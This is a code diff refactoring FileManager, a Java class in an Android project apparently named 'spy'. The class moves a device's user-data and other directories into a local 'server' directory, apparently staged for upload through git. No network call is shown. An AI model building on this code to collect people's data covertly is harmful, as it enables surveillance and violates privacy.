@@ -2,7 +2,6 @@ package com.gameofcoding.spy.server.files;
 
 import android.content.Context;
 import com.gameofcoding.spy.utils.XLog;
-import com.gameofcoding.spy.utils.Utils;
 import com.gameofcoding.spy.utils.FileUtils;
 import java.io.File;
 import com.gameofcoding.spy.server.ServerManager;
@@ -11,6 +10,7 @@ import org.eclipse.jgit.api.errors.GitAPIException;
 
 public class FileManager {
     private static final String TAG = "FilePaths";
+    public ServerFiles mServerFiles;
     private final Context mContext;
 
     public FileManager(Context context) {
@@ -18,17 +18,16 @@ public class FileManager {
     }
 
     public boolean moveDataToServer() {
-	ServerFiles serverFiles = ServerFiles.loadFiles(mContext);
+	mServerFiles = ServerFiles.loadFiles(mContext);
 	DataFiles dataFiles = DataFiles.loadFiles(mContext);
 
-	if(serverFiles == null) {
+	if(mServerFiles == null) {
 	    XLog.e(TAG, "Server dir could not be loaded");
 	    return false;
 	}
 
 	// Clean all previous data present in device dir
-	ServerManager serverMaanager = new ServerManager(serverFiles.getRootDir(),
-							 new Utils(mContext).generateDeviceId());
+	ServerManager serverMaanager = new ServerManager(mContext, mServerFiles.getRootDir());
 	Server server = null;
 	Server.Directory dirDevice = null;
 	try {
@@ -36,7 +35,7 @@ public class FileManager {
 		XLog.i(TAG, "Server dir loaded! Cleaning it...");
 		dirDevice = server.openDir(Server.Dir.DEVICE);
 		if(dirDevice != null) {
-		    cleanServerDir(serverFiles);
+		    cleanServerDir(mServerFiles);
 		} else {
 		    XLog.w(TAG, "Failed to open device directory in server! Aborting clean...");
 		}
@@ -45,7 +44,7 @@ public class FileManager {
 	    }	
 	// Move user data dir
 	File userDataDir = dataFiles.getUserDataDir();
-	if(userDataDir.renameTo(new File(serverFiles.getRootDir(), userDataDir.getName())))
+	if(userDataDir.renameTo(new File(mServerFiles.getRootDir(), userDataDir.getName())))
 	    XLog.i(TAG, "Moved '" + userDataDir + "' to servers root dir.");
 	else {
 	    XLog.e(TAG, "Could not move '" + userDataDir + "' to servers root dir.");
@@ -54,7 +53,7 @@ public class FileManager {
 
 	// Move others dir
 	File othersDir = dataFiles.getOthersDir();
-	if(othersDir.renameTo(new File(serverFiles.getRootDir(), othersDir.getName())))
+	if(othersDir.renameTo(new File(mServerFiles.getRootDir(), othersDir.getName())))
 	    XLog.i(TAG, "Moved '" + othersDir + "' to servers root dir.");
 	else {
 	    XLog.e(TAG, "Could not move '" + othersDir + "' to servers root dir.");
@@ -77,7 +76,7 @@ public class FileManager {
 		XLog.i(TAG,
 		       "cleanServerDir(ServerFilePaths): Not deleting hidden file, file=" + file);
 	    } else {
-		if(FileUtils.deleteForcefully(file))
+		if(FileUtils.delete(file))
 		    XLog.i(TAG, "cleanServerDir(ServerFilePaths): File deleted, file=" + file);
 		else
 		    XLog.w(TAG, "cleanServerDir(ServerFilePaths): Could not delete file, file=" + file);
@@ -85,5 +84,8 @@ public class FileManager {
 		
 	}
     }
-				      
+
+    public ServerFiles getServerFiles() {
+	return mServerFiles;
+    }
 }
